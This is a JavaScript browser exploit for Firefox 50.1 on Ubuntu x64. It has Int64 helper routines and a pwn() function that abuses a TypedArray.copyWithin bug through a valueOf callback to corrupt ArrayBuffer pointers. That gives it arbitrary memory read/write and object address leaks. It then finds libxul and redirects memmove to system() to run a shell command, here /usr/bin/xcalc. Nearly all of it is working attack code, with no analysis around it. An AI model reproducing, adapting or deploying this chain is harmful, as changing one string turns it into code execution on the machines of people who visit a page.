//
// Utility stuff.
//

// Return the hexadecimal representation of the given byte.
function hex(b) {
    return ('0' + b.toString(16)).substr(-2);
}

// Return the hexadecimal representation of the given byte array.
function hexlify(bytes) {
    var res = [];
    for (var i = 0; i < bytes.length; i++)
        res.push(hex(bytes[i]));

    return res.join('');
}

// Return the binary data represented by the given hexdecimal string.
function unhexlify(hexstr) {
    if (hexstr.length % 2 == 1)
        throw new TypeError("Invalid hex string");

    var bytes = new Uint8Array(hexstr.length / 2);
    for (var i = 0; i < hexstr.length; i += 2)
        bytes[i/2] = parseInt(hexstr.substr(i, 2), 16);

    return bytes;
}

function hexdump(data) {
    if (typeof data.BYTES_PER_ELEMENT !== 'undefined')
        data = Array.from(data);

    var lines = [];
    for (var i = 0; i < data.length; i += 16) {
        var chunk = data.slice(i, i+16);
        var parts = chunk.map(hex);
        if (parts.length > 8)
            parts.splice(8, 0, ' ');
        lines.push(parts.join(' '));
    }

    return lines.join('\n');
}

function print(msg) {
    console.log(msg);
    document.body.innerText += msg + '\n';
}

//
// Datatype to represent 64-bit integers.
//
// Internally, the integer is stored as a Uint8Array in little endian byte order.
function Int64(v) {
    // The underlying byte array.
    var bytes = new Uint8Array(8);

    switch (typeof v) {
        case 'number':
            v = '0x' + Math.floor(v).toString(16);
        case 'string':
            if (v.startsWith('0x'))
                v = v.substr(2);
            if (v.length % 2 == 1)
                v = '0' + v;

            var bigEndian = unhexlify(v, 8);
            bytes.set(Array.from(bigEndian).reverse());
            break;
        case 'object':
            if (v instanceof Int64) {
                bytes.set(v.bytes());
            } else {
                if (v.length != 8)
                    throw TypeError("Array must have excactly 8 elements.");
                bytes.set(v);
            }
            break;
        case 'undefined':
            break;
        default:
            throw TypeError("Int64 constructor requires an argument.");
    }

    // Return the underlying bytes of this number as array.
    this.bytes = function() {
        return Array.from(bytes);
    };

    // Return the byte at the given index.
    this.byteAt = function(i) {
        return bytes[i];
    };

    // Return the value of this number as unsigned hex string.
    this.toString = function() {
        return '0x' + hexlify(Array.from(bytes).reverse());
    };

    // Basic arithmetic.
    // These functions assign the result of the computation to their 'this' object.

    // Decorator for Int64 instance operations. Takes care
    // of converting arguments to Int64 instances if required.
    function operation(f, nargs) {
        return function() {
            if (arguments.length != nargs)
                throw Error("Not enough arguments for function " + f.name);
            for (var i = 0; i < arguments.length; i++)
                if (!(arguments[i] instanceof Int64))
                    arguments[i] = new Int64(arguments[i]);
            return f.apply(this, arguments);
        };
    }

    // this == other
    this.equals = operation(function(other) {
        for (var i = 0; i < 8; i++) {
            if (this.byteAt(i) != other.byteAt(i))
                return false;
        }
        return true;
    }, 1);

    // this = -n (two's complement)
    this.assignNeg = operation(function neg(n) {
        for (var i = 0; i < 8; i++)
            bytes[i] = ~n.byteAt(i);

        return this.assignAdd(this, Int64.One);
    }, 1);

    // this = a + b
    this.assignAdd = operation(function add(a, b) {
        var carry = 0;
        for (var i = 0; i < 8; i++) {
            var cur = a.byteAt(i) + b.byteAt(i) + carry;
            carry = cur > 0xff | 0;
            bytes[i] = cur;
        }
        return this;
    }, 2);

    // this = a - b
    this.assignSub = operation(function sub(a, b) {
        var carry = 0;
        for (var i = 0; i < 8; i++) {
            var cur = a.byteAt(i) - b.byteAt(i) - carry;
            carry = cur < 0 | 0;
            bytes[i] = cur;
        }
        return this;
    }, 2);

    // this = a << 1
    this.assignLShift1 = operation(function lshift1(a) {
        var highBit = 0;
        for (var i = 0; i < 8; i++) {
            var cur = a.byteAt(i);
            bytes[i] = (cur << 1) | highBit;
            highBit = (cur & 0x80) >> 7;
        }
        return this;
    }, 1);

    // this = a >> 1
    this.assignRShift1 = operation(function rshift1(a) {
        var lowBit = 0;
        for (var i = 7; i >= 0; i--) {
            var cur = a.byteAt(i);
            bytes[i] = (cur >> 1) | lowBit;
            lowBit = (cur & 0x1) << 7;
        }
        return this;
    }, 1);

    // this = a & b
    this.assignAnd = operation(function and(a, b) {
        for (var i = 0; i < 8; i++) {
            bytes[i] = a.byteAt(i) & b.byteAt(i);
        }
        return this;
    }, 2);
}

// Constructs a new Int64 instance with the same bit representation as the provided double.
Int64.fromJSValue = function(bytes) {
    bytes[7] = 0;
    bytes[6] = 0;
    return new Int64(bytes);
};

// Convenience functions. These allocate a new Int64 to hold the result.

// Return ~n (two's complement)
function Neg(n) {
    return (new Int64()).assignNeg(n);
}

// Return a + b
function Add(a, b) {
    return (new Int64()).assignAdd(a, b);
}

// Return a - b
function Sub(a, b) {
    return (new Int64()).assignSub(a, b);
}

function LShift1(a) {
    return (new Int64()).assignLShift1(a);
}

function RShift1(a) {
    return (new Int64()).assignRShift1(a);
}

function And(a, b) {
    return (new Int64()).assignAnd(a, b);
}

function Equals(a, b) {
    return a.equals(b);
}

// Some commonly used numbers.
Int64.Zero = new Int64(0);
Int64.One = new Int64(1);


function pwn() {
    // Allocate multiple ArrayBuffers of the largest size such that the data is still stored inline
    var buffers = [];
    for (var i = 0; i < 100; i++) {
        buffers.push(new ArrayBuffer(96));
    }

    var view = new Uint8Array(buffers[79]);
    var hax = { valueOf: function() { view.offset = 88; return 0; } };

    // Trigger the bug first time to leak the data pointer of the following ArrayBuffer
    view.copyWithin(hax, 32+8, 40+8);

    // First qword in adjusted view now contains the data pointer (which is stored as a Private, thus needs to be shifted)
    var ptr = LShift1(new Int64(view));
    // ptr will point to inline data so we can calculate the address of the preceeding ArrayBuffer
    var addressOfInnerArrayBuffer = Sub(ptr, 8*8 + 8*8 + 8*12);

    // Trigger the bug a second time to write the modified data pointer
    view.set(RShift1(addressOfInnerArrayBuffer).bytes());
    view.offset = 0;
    view.copyWithin(32+8, hax, 8);

    // Look for the modified ArrayBuffer
    var buffer = null;
    for (var i = 0; i < buffers.length; i++) {
        var ab = new Uint32Array(buffers[i]);
        if (ab[3] != 0) {
            buffer = buffers[i];
            break;
        }
    }
    if (buffer == null) {
        print("Failed");
        return;
    }

    // |outer| is a byte view onto the corrupted ArrayBuffer which now allows us to arbitrarily modify the ArrayBuffer |inner|
    var inner = buffers[79];
    var outer = new Uint8Array(buffer);

    // Increase the size of the inner ArrayBuffer
    outer[43] = 0x1;

    // Object to access the process' memory
    var memory = {
        write: function(addr, data) {
            // Set data pointer of |inner|
            outer.set(RShift1(addr).bytes(), 32);
            // Uint8Array's cache the data pointer of the underlying ArrayBuffer
            var innerView = new Uint8Array(inner);
            innerView.set(data);
        },
        read: function(addr, length) {
            // Set data pointer of |inner|
            outer.set(RShift1(addr).bytes(), 32);
            // Uint8Array's cache the data pointer of the underlying ArrayBuffer
            var innerView = new Uint8Array(inner);
            return innerView.slice(0, length);
        },
        readPointer: function(addr) {
            return new Int64(this.read(addr, 8));
        },
        addrof: function(obj) {
            // To leak the address of |obj|, we set it as property of the |inner|
            // ArrayBuffer, then leak that using the existing read() method.
            inner.leakMe = obj;
            var addressOfSlotsArray = this.readPointer(Add(addressOfInnerArrayBuffer, 2*8));
            return Int64.fromJSValue(this.read(addressOfSlotsArray, 8));
        },
    };

    // This is super hackish: we replace memmove() with system(), then call
    // TypedArray.copyWithin, which at some point calls memmove with the first argument
    // pointing to controlled data.
    // Since a different memmove implementation is chosen at runtime based on the platform,
    // we use a different libc function (sscanf) to calculate the address of system()

    // f297eab40327e83abccb1803a50edfac  /lib/x86_64-linux-gnu/libc.so.6
    var systemToSscanf = 0x6a890 - 0x45390;

    // Firefox 50.1 Ubuntu x64
    //    readelf --relocs libxul.so | grep memmove
    var memmoveOffset = 0x4b1e160;
    //    readelf --relocs libxul.so | grep sscanf
    var sscanfOffset = 0x4b1e198;
    //    ??? TODO get rid of this and implement bit masks instead for the following function
    var maxFuncOffset = 0x410;

    function findElfStart(addr) {
        while (true) {
            var d = memory.read(addr, 4);
            if (d[0] == 0x7f && d[1] == 0x45 && d[2] == 0x4c && d[3] == 0x46) {
                return addr;
            }
            addr = Sub(addr, 0x1000);
        }
    }

    // Read the native function pointer of Math.max (Any native function would do)
    // and calculate the base address of XUL from that.
    var moduleBase = memory.readPointer(Add(memory.addrof(Math.max), 40));
    var moduleBase = findElfStart(Sub(moduleBase, maxFuncOffset));
    print("XUL Base address: " + moduleBase.toString());

    var addressOfMemmovePointer = Add(moduleBase, memmoveOffset);
    var addressOfSscanfPointer = Add(moduleBase, sscanfOffset);

    var addressOfSscanf = memory.readPointer(addressOfSscanfPointer);
    print("sscanf @ " + addressOfSscanf.toString());

    var addressOfMemmove = memory.readPointer(addressOfMemmovePointer);
    print("memmove @ " + addressOfMemmove.toString());

    var addressOfSystem = Sub(addressOfSscanf, systemToSscanf);
    print("system @ " + addressOfSystem.toString());

    var target = new Uint8Array(100);
    var cmd = "/usr/bin/xcalc";
    for (var i = 0; i < cmd.length; i++) {
        target[i] = cmd.charCodeAt(i);
    }
    memory.write(addressOfMemmovePointer, addressOfSystem.bytes());
    target.copyWithin(0, 1);
    memory.write(addressOfMemmovePointer, addressOfMemmove.bytes());

    print("Done");
}
